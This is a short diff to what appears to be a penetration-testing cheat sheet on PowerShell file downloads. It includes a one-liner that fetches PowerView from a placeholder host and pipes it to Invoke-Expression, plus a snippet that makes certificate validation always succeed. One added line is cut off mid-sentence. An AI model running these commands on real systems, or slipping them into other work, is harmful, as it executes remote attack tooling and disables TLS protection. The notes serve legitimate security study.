@@ -95,9 +95,10 @@ Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
 ```powershell
 Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 ```
+- This makes powershell 
 
 #### Workaround for invalid SSL/TLS
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
-- This makes certificate validation callback always accept 
+- This makes certificate validation callback always accept the certification 
